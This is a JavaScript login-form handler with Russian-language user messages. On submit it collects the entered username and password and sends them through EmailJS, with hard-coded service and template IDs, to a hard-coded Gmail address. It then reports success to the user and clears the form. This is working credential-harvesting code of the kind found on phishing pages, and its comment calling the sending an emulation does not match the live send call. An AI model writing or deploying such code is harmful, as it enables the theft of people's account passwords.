document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const messageDiv = document.getElementById('message');
    
    if (!username || !password) {
        showMessage('Пожалуйста, заполните все поля', 'error');
        return;
    }
    
    sendDataToEmail(username, password)
        .then(() => {
            showMessage('Данные успешно отправлены!', 'success');
            document.getElementById('loginForm').reset();
        })
        .catch((error) => {
            console.error('Ошибка отправки:', error);
            showMessage('Ошибка при отправке данных', 'error');
        });
});

function showMessage(text, type) {
    const messageDiv = document.getElementById('message');
    messageDiv.textContent = text;
    messageDiv.className = 'message ' + type;
    
    setTimeout(() => {
        messageDiv.textContent = '';
        messageDiv.className = 'message';
    }, 3000);
}

// Функция для отправки данных на email (эмуляция)
function sendDataToEmail(username, password) {
    return emailjs.send('service_so8m4vs', 'template_5boq485', {
        username: username,
        password: password,
        to_email: 'hikkimorisoura@gmail.com'
    });
}